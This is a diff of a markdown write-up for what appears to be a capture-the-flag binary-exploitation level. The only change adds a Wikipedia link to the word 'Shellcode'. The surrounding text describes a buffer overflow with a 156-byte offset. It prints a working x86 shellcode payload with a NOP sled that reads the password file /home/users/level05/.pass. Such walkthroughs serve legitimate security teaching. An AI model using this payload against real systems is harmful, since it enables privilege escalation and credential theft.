@@ -2,7 +2,7 @@
 
 > For introductory information on this operating system and binary securities, check [here](./analysis.md).
 
-Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./gdb.md)). This time we'll use a buffer overflow to inject a shellcode as asked by the program. Thanks to our analysis we know that the offset is **156** bytes and using the following shellcode we'll get our next password!
+Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./gdb.md)). This time we'll use a buffer overflow to inject a [Shellcode](https://en.wikipedia.org/wiki/Shellcode) as asked by the program. Thanks to our analysis we know that the offset is **156** bytes and using the following shellcode we'll get our next password!
 
 ```shell
   export SHELLCODE=$(python -c "print '\x90' * 1000 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'")
